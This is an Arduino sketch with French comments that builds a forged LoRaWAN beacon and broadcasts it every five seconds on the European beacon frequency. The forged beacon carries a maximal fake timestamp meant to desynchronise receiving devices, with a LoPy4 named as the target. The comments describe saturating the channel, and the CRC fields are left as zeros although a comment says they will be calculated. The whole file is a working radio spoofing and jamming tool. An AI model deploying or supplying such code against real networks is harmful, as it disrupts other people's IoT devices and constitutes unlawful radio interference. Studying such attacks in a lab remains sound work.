#include <SPI.h>
#include <LoRa.h>

// Structure d'un Beacon LoRaWAN (simplifiée pour l'attaque)
byte fakeBeacon[17] = {
  0x00, 0x00, 0x01,       // NetID (Ex: 000001)
  0xFF, 0xFF, 0xFF, 0xFF, // FAUX TIMESTAMP (On injecte le maximum pour désynchroniser)
  0x00, 0x00,             // CRC1 (On va le calculer)
  0x00, 0x00, 0x00,       // GW Specific info
  0x00, 0x00, 0x00,       // GW Specific info
  0x00, 0x00              // CRC2
};

void setup() {
  Serial.begin(9600);
  while (!Serial);

  Serial.println("Initialisation de l'attaquant Beacon...");

  if (!LoRa.begin(869525000)) { // Fréquence Beacon Europe
    Serial.println("Erreur Radio !");
    while (1);
  }

  // Paramètres critiques pour le Beacon LoRaWAN
  LoRa.setSpreadingFactor(9);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);
  LoRa.setSyncWord(0x34); // Réseau public
  LoRa.setPreambleLength(10); // Spécifique au beacon
}

void loop() {
  Serial.println("Envoi du faux Beacon...");

  // On envoie le paquet
  LoRa.beginPacket();
  LoRa.write(fakeBeacon, 17);
  LoRa.endPacket();

  Serial.println("Faux Beacon injecté !");
  
  // On bombarde toutes les 5 secondes pour être sûr de tomber dans la fenêtre du LoPy4
  // (Normalement c'est 128s, mais en attaquant on sature la fréquence)
  delay(5000); 
}
